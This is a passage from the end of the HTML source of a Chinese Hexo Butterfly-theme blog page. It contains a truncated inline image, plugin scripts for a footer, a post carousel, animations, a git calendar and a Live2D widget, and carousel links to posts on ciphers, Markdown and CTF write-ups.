INnyo5X8cOQ65TIIXZfwdghCx39C8c3Wp5j5Uu3fHwOoYrr8brzASli5DeDvRYPr30JVz8vESNV9WnUA6yjMdVJWD4WBjeHKOjih1FmzI75oWgFXVovUltubbTwcLwHJZ0z5pDFDbidUh2piQFu2HkXtHRBhQl958POXdDMX3cXJ+Ok1lGYiio4oxt8eIPo6WchOG0W5DhspxeJVuLOXqTK7hl3rDIcV8xSiWnjCSYWEUvIZrzPDc4EnDQVFmyFfAN2jEYvvAFCVjk8kWzYP6QOWJaG0QkH+m9jYN0NaAN4aD38/AHId9YVPul56XiEhyY6K6y99z2II3krXlehnM6S8rfu3Rm1/EawKmHM2QxT34FQpRyD9bgAbZ81LCpCz7wYfmudPtsThfNegJ27ZZGTcnjhSCnZOc+p0nsmHy/vTRardIcnHmTX/pE0yw7UMhpNQFUNjLoAnjlfxgEs24uauwbe2gw40Ff2gt8NgDOLhKkw6JvfRL2yEnKyLKCwHF5VKb1+Nl9tvGlKU/DdpME6OfztB4zFy0fRLCeAI+2sX1VUNjZGDETffz6qbcMnSPTnIbj336i/fij7fKlTpSDmUREMMvHSp9Tss5tEeGhiAAD0vw88wJD5XUnGLiDfl1v35GYMaqLoTm1RY/qhb+kNNUnUcxvg2Q9hz37ISjsLDBJKy2uC5OYs4z9jdqvT8yY0Jb8n4CiH9ReZce/PNp5Y1hqP60L8nrpAxK3T5AlrAeVyytt2GnUPQIeiQeLmv5j+yz1M6z/xRPxr5IQAkCKttWLE27NZvOIknI6h+D05hx15h7r3SROCkRCmepvbBu/nqV9MOJH/HTqhAKRIa63MGR/ONh7/oAWVpZfg9ebgc9Y9h1gTh2ikhubN/85d5+5nYq8T8sbr0w8CQIq01op1h2abz28oMl752CBYdjGYb1HY0uTa0zFv7VNpnJo77of+69yPQlprh/6yatKP+afJn+gn+on4L4cd/2hQhc+BAAAAAElFTkSuQmCC" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/5.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/op/image/hutao/hutao.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-10-27</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/5.html&quot;);" href="javascript:void(0);" alt="">古典密码</a><div class="blog-slider__text">古典密码大全</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/5.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/0.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/op/image/qiqi/qiqi.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-08-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/0.html&quot;);" href="javascript:void(0);" alt="">Markdown语法与外挂标签写法汇总</a><div class="blog-slider__text">🥧本文汇总Markdown格式以及外挂标签在网页端的渲染效果，可作为文档进行查询</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/0.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/17.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/圖片 (5).jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-11-29</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/17.html&quot;);" href="javascript:void(0);" alt="">CTF之CTFHub学习记录</a><div class="blog-slider__text">CTFHub技能树+详细Write up</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/17.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/19.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/45136636_p0.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-12-10</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/19.html&quot;);" href="javascript:void(0);" alt="">CTF之WebGoat学习记录</a><div class="blog-slider__text">WebGoat8.22之Write up</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/19.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__bounceInLeft');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('blog-slider swiper-container-fade swiper-container-horizontal');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('catalog_magnet');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '1.5s·');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('pagination');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__jackInTheBox');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__flipInY');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__animated');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__slideInRight');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__flipInY');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__animated');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" id="gitcalendarBar" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 320px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/site/census/'|| '/site/census/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("/api?null",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'null')
    }
  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>